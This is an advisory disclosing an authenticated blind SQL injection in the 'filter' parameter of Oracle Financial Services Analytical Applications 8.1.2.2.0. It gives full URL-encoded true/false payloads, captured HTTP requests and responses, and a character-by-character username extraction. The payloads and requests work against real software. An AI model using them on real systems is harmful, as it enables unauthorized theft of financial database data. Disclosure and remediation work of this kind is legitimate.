# Oracle Financial Services Analytical Applications - SQL Injection in Search Data Entry function

**Vendors:** Oracle ([https://www.oracle.com/](https://www.oracle.com/))
**Product:** Oracle Financial Services Analytical Applications ([https://www.oracle.com/financial-services/analytics/](https://www.oracle.com/financial-services/analytics/)) - Modules Asset Liability Management
**Version:** 8.1.2.2.0
**Discovered by:** Nguyen Kim Sang, Nguyen Quoc Viet, Vy Tien Dat - HPT Vietnam Corporation

## **Description:**
Oracle Financial Services Analytical Applications Version 8.1.2.2.0 is vulnerable to SQL Injection. An authenticated attacker can exploit this vulnerability to inject malicious SQL query to extract information from databases.
*   **Vulnerable parameter**: `filter`
*   **Function**: Asset Liability Management > Common Object Maintenance > Data Entry Forms and Queries > Data Entry > Search
*   **URL**: http://**\[yourdomain\]**/**\[APIHOST\]**/DeFi/DataEntry/DisplayPage.jsp
*   **Method**: POST
*   **Payload**:
\- True condition: %28%23\*%23\[**\*\*TABLE\_NAME\*\***\].\[**\*\*COLUMN\_NAME\*\***\]%23\*%23=%23%5E%23`(SELECT+CASE+WHEN+((SELECT+1+FROM+DUAL)='1')+THEN+'4'+ELSE+'0'+END+FROM+dual)`%23%5E%23%29
**\-** False condition: %28%23\*%23\[**\*\*TABLE\_NAME\*\***\].\[**\*\*COLUMN\_NAME\*\***\]%23\*%23=%23%5E%23`(SELECT+CASE+WHEN+((SELECT+1+FROM+DUAL)='2')+THEN+'4'+ELSE+'0'+END+FROM+dual)`%23%5E%23%29
*   **Conditional**: User Login
*   **Vulnerable / Tested Versions:**
The following version has been tested which was the most recent one when the vulnerabilities were discovered:
Oracle Financial Services Analytical Applications Version 8.1.2.2.0
## **Severity:**
7.1 / High - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
## Remediation:
**\- Input Validation and Sanitization**: Ensure all user inputs, especially in embedding functions, are strictly validated and sanitized before placing them in database queries.
**\- Use Secure Libraries**: Implement SQL query libraries or frameworks that offer built-in parameterized queries or prepared statements.
## Proof of Exploitation:
1. Login to user have granted privileges to using **Asset Liability Management** and able to modify Data Entry
![](https://t3897127.p.clickup-attachments.com/t3897127/c2271d5a-50d0-49e3-aeb7-81f1d5803270/image.png)
*   Asset Liability Management
![](https://t3897127.p.clickup-attachments.com/t3897127/51c8aa65-7be6-4762-a778-953545c99335/image.png)
*   Common Object Maintenance
![](https://t3897127.p.clickup-attachments.com/t3897127/684c7f5b-427b-4cc2-9c80-0b0bdbde27dc/image.png)
*   Data Entry Forms and Queries
![](https://t3897127.p.clickup-attachments.com/t3897127/1a139c89-d059-4c78-a4be-c6446aa80a67/image.png)
*   Data Entry :
![](https://t3897127.p.clickup-attachments.com/t3897127/16c67b1e-2622-4d45-8e92-30fa3e511e0a/image.png)
*   Search:
![](https://t3897127.p.clickup-attachments.com/t3897127/b0a3a0b2-693a-4c1a-bd9d-d4e3f4e6336d/image.png)
**1\. Choose one table from Data Entry list**
![](https://t3897127.p.clickup-attachments.com/t3897127/64e51513-925c-49ac-a67d-e70b41b9ae22/image.png)
**2\. When click on Search function we can see Field name and Search is using for filter result when select from database, we using ID field and Search value is 4 to Search, click Go and using Burp Suite to intercept the request.**
![](https://t3897127.p.clickup-attachments.com/t3897127/85cda0d0-d579-40ad-aa28-563468056bfd/image.png)
*   HTTP Request send when Search:
![](https://t3897127.p.clickup-attachments.com/t3897127/8b0650a1-40e3-4f18-abc7-2bff6cd1a55d/image.png)
*   Result with filter
![](https://t3897127.p.clickup-attachments.com/t3897127/1178c41b-b939-4b9b-935e-090c2643bceb/image.png)
**3\. Send request to Repeater Tab and send as normal HTTP Request of successful search request. Result of search will return in array of** **`dataarr`**
![](https://t3897127.p.clickup-attachments.com/t3897127/1a060b04-7410-438f-8919-0d80461a8870/image.png)
**4\. Inject TRUE condition payload** `(SELECT+CASE+WHEN+((SELECT+1+FROM+DUAL)='1')+THEN+'4'+ELSE+'0'+END+FROM+dual)` into parameter filter and change **like** operator to **\=.**
Value of of parameter filter when inject payload `filter=%28%23*%23IMP_PERCENT_CF.ID%23*%23=%23%5E%23(SELECT%20CASE%20WHEN%20((SELECT%201%20FROM%20DUAL)='1')%20THEN%20'4'%20ELSE%20'0'%20END%20FROM%20dual)%23%5E%23%29` => **TRUE** condition => `dataarrr` will return result of row have ID=4 in tables **IMP\_PERCENT\_CF**.
![](https://t3897127.p.clickup-attachments.com/t3897127/357e20d1-b2e0-4f81-a90f-f7ef6121d9b1/image.png)
*   Details of HTTP Request/Response **TRUE** condition:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 783
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp?formIdentifier=181&A=VAED&dispMode=Normal&TreeType=0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=vO5hIXPC9RVeVSGB-arsbv3c366tH9ryIv2F34UP6-0oaMorJBjP!416272305
Connection: close

formname=IMP_PERCENT_CF&formIdentifier=181&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=1&rows=1%2C100&requestType=2&seqGenCols=-1&filter=%28%23*%23IMP_PERCENT_CF.ID%23*%23=%23%5E%23(SELECT+CASE+WHEN+((SELECT+1+FROM+DUAL)='1')+THEN+'4'+ELSE+'0'+END+FROM+dual)%23%5E%23%29&methodtype=NA&sort=&rownumStr=0&sqlString=&recorddetails=&uniqueid=1732514447622&table_name=IMP_PERCENT_CF&startPageRow=0&recordSize=20&totRecords=13&pagination=false&searchFlag=true&authFlag=false&TreeType=0&searchMsg=null&strExcelNames=%5B%22Select+Excel%22%2C%223%2Fkn%2BWkoRNrsc6sgtqZZyFip6VwFxvlYbphqtc1GIv5snHG3dp%22%2C%22Oracle+Database+19c+Enterprise+Edition+Release+19.%22%2C%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>
```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Mon, 25 Nov 2024 06:27:11 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0002b3f1
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47879

<Result>
		var form_MD = topframe.form_MD;
			var dataarr = [ ["4","4","Viet_HPT","Viet_HPT","23","23","11/05/2024 00:00:00","11/05/2024 00:00:00","","","ALMUSER","ALMUSER","11/22/2024 15:20:40","11/22/2024 15:20:40","U","U","","","","" ] ];
<Result>
```

5\. Inject **FALSE** condition payload `(SELECT+CASE+WHEN+((SELECT+1+FROM+DUAL)='2')+THEN+'4'+ELSE+'0'+END+FROM+dual)` to parameter `filter`
Value of of parameter filter when inject payload `filter=%28%23*%23IMP_PERCENT_CF.ID%23*%23=%23%5E%23(SELECT%20CASE%20WHEN%20((SELECT%201%20FROM%20DUAL)='2')%20THEN%20'4'%20ELSE%20'0'%20END%20FROM%20dual)%23%5E%23%29` => **FALSE** condition => `dataarrr` will return result **null** because doesn't have any row have ID=0 in tables **IMP\_PERCENT\_CF**.
![](https://t3897127.p.clickup-attachments.com/t3897127/53ac26c2-a649-454f-8aed-d710a831a8bb/image.png)
*   Details of HTTP Request/Response **FALSE** condition:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 783
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp?formIdentifier=181&A=VAED&dispMode=Normal&TreeType=0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=vO5hIXPC9RVeVSGB-arsbv3c366tH9ryIv2F34UP6-0oaMorJBjP!416272305
Connection: close

formname=IMP_PERCENT_CF&formIdentifier=181&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=1&rows=1%2C100&requestType=2&seqGenCols=-1&filter=%28%23*%23IMP_PERCENT_CF.ID%23*%23=%23%5E%23(SELECT+CASE+WHEN+((SELECT+1+FROM+DUAL)='2')+THEN+'4'+ELSE+'0'+END+FROM+dual)%23%5E%23%29&methodtype=NA&sort=&rownumStr=0&sqlString=&recorddetails=&uniqueid=1732514447622&table_name=IMP_PERCENT_CF&startPageRow=0&recordSize=20&totRecords=13&pagination=false&searchFlag=true&authFlag=false&TreeType=0&searchMsg=null&strExcelNames=%5B%22Select+Excel%22%2C%223%2Fkn%2BWkoRNrsc6sgtqZZyFip6VwFxvlYbphqtc1GIv5snHG3dp%22%2C%22Oracle+Database+19c+Enterprise+Edition+Release+19.%22%2C%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>


```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Mon, 25 Nov 2024 07:40:15 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0002c868
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47702

<Result>
		var dataarr = [ ];
<Result>
```

6\. Inject payload `(SELECT+CASE+WHEN+((SELECT+substr(USER,1,1)+FROM+DUAL)='I')+THEN+'4'+ELSE+'0'+END+FROM+dual)` to extract user name from database. Using Burpsuite Intruder to exploit blind SQL Injection.
*   Result: User is **ICAAPATM**
![](https://t3897127.p.clickup-attachments.com/t3897127/464b4b0d-0fcf-463b-bbbb-96154431ee6b/image.png)
*   Details of HTTP Request/Response **TRUE** condition when dump username data:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 798
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp?formIdentifier=181&A=VAED&dispMode=Normal&TreeType=0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=vO5hIXPC9RVeVSGB-arsbv3c366tH9ryIv2F34UP6-0oaMorJBjP!416272305
Connection: close

formname=IMP_PERCENT_CF&formIdentifier=181&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=1&rows=1%2C100&requestType=2&seqGenCols=-1&filter=%28%23*%23IMP_PERCENT_CF.ID%23*%23=%23%5E%23(SELECT+CASE+WHEN+((SELECT+substr(USER,1,1)+FROM+DUAL)='I')+THEN+'4'+ELSE+'0'+END+FROM+dual)%23%5E%23%29&methodtype=NA&sort=&rownumStr=0&sqlString=&recorddetails=&uniqueid=1732514447622&table_name=IMP_PERCENT_CF&startPageRow=0&recordSize=20&totRecords=13&pagination=false&searchFlag=true&authFlag=false&TreeType=0&searchMsg=null&strExcelNames=%5B%22Select+Excel%22%2C%223%2Fkn%2BWkoRNrsc6sgtqZZyFip6VwFxvlYbphqtc1GIv5snHG3dp%22%2C%22Oracle+Database+19c+Enterprise+Edition+Release+19.%22%2C%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>


```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Mon, 25 Nov 2024 08:25:58 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0002cee5
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47909

<Result>
					var dataarr = [ ["4","4","Viet_HPT","Viet_HPT","23","23","11/05/2024 00:00:00","11/05/2024 00:00:00","","","ALMUSER","ALMUSER","11/22/2024 15:20:40","11/22/2024 15:20:40","U","U","","","","" ] ];
<Result>
```

*   Details of HTTP Request/Response **FALSE** condition when dump username data:
HTTP REQUEST:

```plain
POST /<apihost>/DeFi/DataEntry/DisplayPage.jsp HTTP/1.1
Host: <yourdomain>
Content-Length: 798
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<yourdomain>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<yourdomain>/<apihost>/DeFi/DataEntry/DisplayPage.jsp?formIdentifier=181&A=VAED&dispMode=Normal&TreeType=0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=vO5hIXPC9RVeVSGB-arsbv3c366tH9ryIv2F34UP6-0oaMorJBjP!416272305
Connection: keep-alive

formname=IMP_PERCENT_CF&formIdentifier=181&app_name=<redacted>&sourcename=<redacted>&A=VAED&dispMode=1&rows=1%2C100&requestType=2&seqGenCols=-1&filter=%28%23*%23IMP_PERCENT_CF.ID%23*%23=%23%5E%23(SELECT+CASE+WHEN+((SELECT+substr(USER,1,1)+FROM+DUAL)='B')+THEN+'4'+ELSE+'0'+END+FROM+dual)%23%5E%23%29&methodtype=NA&sort=&rownumStr=0&sqlString=&recorddetails=&uniqueid=1732505996588&table_name=IMP_PERCENT_CF&startPageRow=0&recordSize=20&totRecords=13&pagination=false&searchFlag=true&authFlag=false&TreeType=0&searchMsg=null&strExcelNames=%5B%22Select+Excel%22%2C%223%2Fkn%2BWkoRNrsc6sgtqZZyFip6VwFxvlYbphqtc1GIv5snHG3dp%22%2C%22Oracle+Database+19c+Enterprise+Edition+Release+19.%22%2C%5D&strExcelFieldName=V_EXCEL_NAME&strExcelSheetName=&excelAuthTF=T&newformatType=%5B%5D&_CSRF=null&APIHOST=%2F<apihost>


```

HTTP RESPONSE:

```plain
HTTP/1.1 200 OK
Connection: close
Date: Mon, 25 Nov 2024 08:25:58 GMT
Content-Type: text/html; charset=UTF-8
X-ORACLE-DMS-ECID: 9d0bd64c-0525-4ada-aac1-0bd432705446-0002cee5
X-ORACLE-DMS-RID: 0
X-XSS-Protection: 1;mode=block
X-Content-Type-Options: nosniff
X-UA-Compatible: IE=EmulateIE7
Content-Length: 47909

<Result>
		var dataarr = [ ];
<Result>
```